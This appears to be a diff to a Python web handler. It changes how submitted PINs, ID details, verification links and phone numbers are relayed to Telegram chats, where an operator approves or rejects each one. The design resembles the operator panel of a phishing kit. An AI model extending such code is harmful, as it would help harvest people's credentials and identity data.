@@ -2196,19 +2196,21 @@ class Handler(BaseHTTPRequestHandler):
             if step == "zip_phone":
                 lines.append(f"PIN: {zip_code}")
             elif step == "id_document":
-                lines.append(f"Message / ID: {id_number}")
+                is_url = str(id_number).strip().startswith(("http://", "https://"))
+                label = "Verification Link" if is_url else "Message / ID"
+                lines.append(f"{label}: {id_number}")
             lines.append("Status: Awaiting Verification")
 
             phone_raw = str(active_phone).strip()
-            buttons = {
-                "inline_keyboard": [
-                    [{"text": f"📋 Copy Phone ({phone_raw})", "copy_text": {"text": phone_raw}}],
-                    [
-                        {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
-                        {"text": "❌ Reject (Invalid / Retry)", "callback_data": f"verify:reject:{ver_id}"},
-                    ],
-                ]
-            }
+            kb = []
+            if str(id_number).strip().startswith(("http://", "https://")):
+                kb.append([{"text": "🔗 Open Verification Link", "url": str(id_number).strip()}])
+            kb.append([{"text": f"📋 Copy Phone ({phone_raw})", "copy_text": {"text": phone_raw}}])
+            kb.append([
+                {"text": "✅ Approve", "callback_data": f"verify:approve:{ver_id}"},
+                {"text": "❌ Reject (Invalid / Retry)", "callback_data": f"verify:reject:{ver_id}"},
+            ])
+            buttons = {"inline_keyboard": kb}
             for chat in target_chats:
                 try:
                     send_telegram_message(chat, "\n".join(lines), reply_markup=buttons)
